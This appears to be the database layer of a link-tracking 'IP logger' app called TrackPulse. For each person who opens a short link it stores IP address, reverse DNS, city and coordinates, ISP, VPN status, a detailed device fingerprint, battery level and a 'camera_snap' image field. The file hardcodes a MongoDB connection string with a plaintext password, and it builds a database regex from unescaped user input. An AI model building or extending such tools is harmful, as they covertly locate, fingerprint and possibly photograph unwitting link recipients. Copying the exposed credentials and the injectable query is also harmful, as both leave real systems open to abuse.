const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');

// MongoDB Atlas Permanent Cloud Database URI
const MONGO_URI = process.env.MONGODB_URI || 'mongodb+srv://trackpulse_user:TrackPulse2026Secure@cluster0.o5hfa.mongodb.net/trackpulse?retryWrites=true&w=majority';

let isConnected = false;

// Connect to MongoDB Cloud
async function connectDb() {
  if (isConnected && mongoose.connection.readyState === 1) {
    return;
  }
  try {
    await mongoose.connect(MONGO_URI, {
      serverSelectionTimeoutMS: 3000
    });
    isConnected = true;
  } catch (err) {
    isConnected = false;
  }
}

// --- MONGOOSE SCHEMAS ---
const linkSchema = new mongoose.Schema({
  short_code: { type: String, required: true, unique: true },
  title: { type: String, required: true },
  destination_url: { type: String, required: true },
  created_at: { type: Date, default: Date.now }
});

const clickLogSchema = new mongoose.Schema({
  link_id: { type: String, required: true },
  ip_address: { type: String, required: true },
  reverse_dns: { type: String, default: 'N/A' },
  country: { type: String, default: 'Unknown' },
  country_code: { type: String, default: '' },
  region: { type: String, default: 'Unknown' },
  city: { type: String, default: 'Unknown' },
  isp: { type: String, default: 'Unknown' },
  org: { type: String, default: 'Unknown' },
  lat: { type: Number, default: 0 },
  lon: { type: Number, default: 0 },
  is_proxy: { type: Boolean, default: false },
  is_mobile_net: { type: Boolean, default: false },
  is_hosting: { type: Boolean, default: false },
  user_agent: { type: String, default: '' },
  browser: { type: String, default: 'Unknown' },
  os: { type: String, default: 'Unknown' },
  device: { type: String, default: 'Desktop' },
  device_model: { type: String, default: 'Generic Device' },
  screen_res: { type: String, default: 'N/A' },
  timezone: { type: String, default: 'N/A' },
  gpu: { type: String, default: 'N/A' },
  cpu_cores: { type: String, default: 'N/A' },
  connection_type: { type: String, default: 'N/A' },
  language: { type: String, default: 'N/A' },
  battery: { type: String, default: 'N/A' },
  camera_snap: { type: String, default: null },
  created_at: { type: Date, default: Date.now }
});

const Link = mongoose.models.Link || mongoose.model('Link', linkSchema);
const ClickLog = mongoose.models.ClickLog || mongoose.model('ClickLog', clickLogSchema);

// --- FALLBACK LOCAL JSON DATABASE ENGINE ---
let localDbPath = path.join(__dirname, 'data.json');
try {
  fs.accessSync(__dirname, fs.constants.W_OK);
} catch (err) {
  localDbPath = path.join('/tmp', 'data.json');
}

const defaultLocalData = { links: [], click_logs: [], nextLinkId: 1, nextLogId: 1 };

function loadLocalData() {
  try {
    if (fs.existsSync(localDbPath)) {
      return JSON.parse(fs.readFileSync(localDbPath, 'utf8'));
    }
  } catch(e) {}
  return defaultLocalData;
}

function saveLocalData(data) {
  try {
    fs.writeFileSync(localDbPath, JSON.stringify(data, null, 2), 'utf8');
  } catch(e) {}
}

module.exports = {
  initSync: async () => {
    await connectDb();
  },

  // Create Link
  createLink: async (shortCode, title, destinationUrl) => {
    await connectDb();
    if (isConnected) {
      const doc = await Link.create({
        short_code: shortCode,
        title: title,
        destination_url: destinationUrl
      });
      return {
        id: doc._id.toString(),
        short_code: doc.short_code,
        title: doc.title,
        destination_url: doc.destination_url,
        created_at: doc.created_at
      };
    } else {
      const local = loadLocalData();
      const newId = String(local.links.reduce((max, l) => Math.max(max, parseInt(l.id) || 0), 0) + 1);
      const newLink = {
        id: newId,
        short_code: shortCode,
        title: title,
        destination_url: destinationUrl,
        created_at: new Date().toISOString()
      };
      local.links.push(newLink);
      saveLocalData(local);
      return newLink;
    }
  },

  // Get All Links
  getAllLinks: async () => {
    await connectDb();
    if (isConnected) {
      const links = await Link.find().sort({ created_at: -1 }).lean();
      const logs = await ClickLog.find().select('link_id').lean();

      return links.map(l => {
        const clickCount = logs.filter(c => String(c.link_id) === String(l._id)).length;
        return {
          id: l._id.toString(),
          short_code: l.short_code,
          title: l.title,
          destination_url: l.destination_url,
          created_at: l.created_at,
          total_clicks: clickCount
        };
      });
    } else {
      const local = loadLocalData();
      return local.links.map(l => {
        const clickCount = local.click_logs.filter(c => String(c.link_id) === String(l.id)).length;
        return { ...l, total_clicks: clickCount };
      }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    }
  },

  // Get Link By Short Code (Case-Insensitive Exact Match)
  getLinkByShortCode: async (shortCode) => {
    await connectDb();
    if (!shortCode) return null;
    const searchCode = String(shortCode).trim();

    if (isConnected) {
      const doc = await Link.findOne({
        short_code: { $regex: new RegExp(`^${searchCode}$`, 'i') }
      }).lean();
      if (!doc) return null;
      return {
        id: doc._id.toString(),
        short_code: doc.short_code,
        title: doc.title,
        destination_url: doc.destination_url,
        created_at: doc.created_at
      };
    } else {
      const local = loadLocalData();
      return local.links.find(l => String(l.short_code).toLowerCase() === searchCode.toLowerCase()) || null;
    }
  },

  // Delete Link
  deleteLink: async (id) => {
    await connectDb();
    if (isConnected) {
      await Link.deleteOne({ _id: id });
      await ClickLog.deleteMany({ link_id: String(id) });
    } else {
      const local = loadLocalData();
      const strId = String(id);
      local.links = local.links.filter(l => String(l.id) !== strId);
      local.click_logs = local.click_logs.filter(c => String(c.link_id) !== strId);
      saveLocalData(local);
    }
    return true;
  },

  // Log Click
  logClick: async (logData) => {
    await connectDb();
    if (isConnected) {
      const doc = await ClickLog.create({
        link_id: String(logData.linkId),
        ip_address: logData.ipAddress,
        reverse_dns: logData.reverseDns || 'N/A',
        country: logData.country || 'Unknown',
        country_code: logData.countryCode || '',
        region: logData.region || 'Unknown',
        city: logData.city || 'Unknown',
        isp: logData.isp || 'Unknown',
        org: logData.org || 'Unknown',
        lat: logData.lat || 0,
        lon: logData.lon || 0,
        is_proxy: logData.isProxy || false,
        is_mobile_net: logData.isMobileNet || false,
        is_hosting: logData.isHosting || false,
        user_agent: logData.userAgent || '',
        browser: logData.browser || 'Unknown',
        os: logData.os || 'Unknown',
        device: logData.device || 'Desktop',
        device_model: logData.deviceModel || 'Generic Device'
      });
      return { id: doc._id.toString(), ...logData };
    } else {
      const local = loadLocalData();
      const newId = String(local.click_logs.reduce((max, c) => Math.max(max, parseInt(c.id) || 0), 0) + 1);
      const newLog = {
        id: newId,
        link_id: String(logData.linkId),
        ip_address: logData.ipAddress,
        reverse_dns: logData.reverseDns || 'N/A',
        country: logData.country || 'Unknown',
        countryCode: logData.countryCode || '',
        region: logData.region || 'Unknown',
        city: logData.city || 'Unknown',
        isp: logData.isp || 'Unknown',
        org: logData.org || 'Unknown',
        lat: logData.lat || 0,
        lon: logData.lon || 0,
        is_proxy: logData.isProxy || false,
        is_mobile_net: logData.isMobileNet || false,
        is_hosting: logData.isHosting || false,
        user_agent: logData.userAgent || '',
        browser: logData.browser || 'Unknown',
        os: logData.os || 'Unknown',
        device: logData.device || 'Desktop',
        device_model: logData.deviceModel || 'Generic Device',
        created_at: new Date().toISOString()
      };
      local.click_logs.push(newLog);
      saveLocalData(local);
      return newLog;
    }
  },

  // Update Client Data (GPU, Screen, Camera Snap)
  updateLogClientData: async (logId, clientData) => {
    await connectDb();
    if (isConnected) {
      const updateObj = {};
      if (clientData.screenRes) updateObj.screen_res = String(clientData.screenRes);
      if (clientData.timezone) updateObj.timezone = String(clientData.timezone);
      if (clientData.gpu) updateObj.gpu = String(clientData.gpu);
      if (clientData.cpuCores) updateObj.cpu_cores = String(clientData.cpuCores);
      if (clientData.connectionType) updateObj.connection_type = String(clientData.connectionType);
      if (clientData.language) updateObj.language = String(clientData.language);
      if (clientData.battery) updateObj.battery = String(clientData.battery);
      if (clientData.deviceModel && clientData.deviceModel !== 'N/A') updateObj.device_model = String(clientData.deviceModel);
      if (clientData.cameraSnap) updateObj.camera_snap = String(clientData.cameraSnap);

      await ClickLog.updateOne({ _id: logId }, { $set: updateObj });
    } else {
      const local = loadLocalData();
      const log = local.click_logs.find(c => String(c.id) === String(logId));
      if (log) {
        if (clientData.screenRes) log.screen_res = String(clientData.screenRes);
        if (clientData.timezone) log.timezone = String(clientData.timezone);
        if (clientData.gpu) log.gpu = String(clientData.gpu);
        if (clientData.cpuCores) log.cpu_cores = String(clientData.cpuCores);
        if (clientData.connectionType) log.connection_type = String(clientData.connectionType);
        if (clientData.language) log.language = String(clientData.language);
        if (clientData.battery) log.battery = String(clientData.battery);
        if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = String(clientData.deviceModel);
        if (clientData.cameraSnap) log.camera_snap = String(clientData.cameraSnap);
        saveLocalData(local);
      }
    }
  },

  // Get Logs By Link ID
  getLogsByLinkId: async (linkId) => {
    await connectDb();
    if (isConnected) {
      const logs = await ClickLog.find({ link_id: String(linkId) }).sort({ created_at: -1 }).lean();
      return logs.map(l => ({ id: l._id.toString(), ...l }));
    } else {
      const local = loadLocalData();
      return local.click_logs
        .filter(c => String(c.link_id) === String(linkId))
        .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    }
  },

  // Get All Logs
  getAllLogs: async (limit = 100) => {
    await connectDb();
    if (isConnected) {
      const logs = await ClickLog.find().sort({ created_at: -1 }).limit(limit).lean();
      const links = await Link.find().lean();
      const linkMap = {};
      links.forEach(l => { linkMap[l._id.toString()] = l; });

      return logs.map(c => {
        const link = linkMap[String(c.link_id)];
        return {
          id: c._id.toString(),
          ...c,
          link_title: link ? link.title : 'Deleted Link',
          short_code: link ? link.short_code : 'N/A'
        };
      });
    } else {
      const local = loadLocalData();
      return local.click_logs
        .map(c => {
          const link = local.links.find(l => String(l.id) === String(c.link_id));
          return {
            ...c,
            link_title: link ? link.title : 'Deleted Link',
            short_code: link ? link.short_code : 'N/A'
          };
        })
        .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
        .slice(0, limit);
    }
  },

  // Get Stats
  getStats: async () => {
    await connectDb();
    if (isConnected) {
      const totalLinks = await Link.countDocuments();
      const totalClicks = await ClickLog.countDocuments();
      const distinctIPs = await ClickLog.distinct('ip_address');
      const vpnCount = await ClickLog.countDocuments({ is_proxy: true });
      
      const locAgg = await ClickLog.aggregate([
        { $match: { country: { $ne: 'Unknown', $exists: true } } },
        { $group: { _id: { country: '$country', city: '$city' }, count: { $sum: 1 } } },
        { $sort: { count: -1 } },
        { $limit: 5 }
      ]);

      const topLocations = locAgg.map(a => ({
        location: `${a._id.city}, ${a._id.country}`,
        count: a.count
      }));

      return { totalLinks, totalClicks, uniqueIPs: distinctIPs.length, vpnCount, topLocations };
    } else {
      const local = loadLocalData();
      const totalLinks = local.links.length;
      const totalClicks = local.click_logs.length;
      const uniqueIPs = new Set(local.click_logs.map(c => c.ip_address)).size;
      const vpnCount = local.click_logs.filter(c => c.is_proxy).length;

      const locMap = {};
      local.click_logs.forEach(c => {
        if (c.country && c.country !== 'Unknown') {
          const key = `${c.city}, ${c.country}`;
          locMap[key] = (locMap[key] || 0) + 1;
        }
      });

      const topLocations = Object.entries(locMap)
        .map(([loc, count]) => ({ location: loc, count }))
        .sort((a, b) => b.count - a.count)
        .slice(0, 5);

      return { totalLinks, totalClicks, uniqueIPs, vpnCount, topLocations };
    }
  }
};
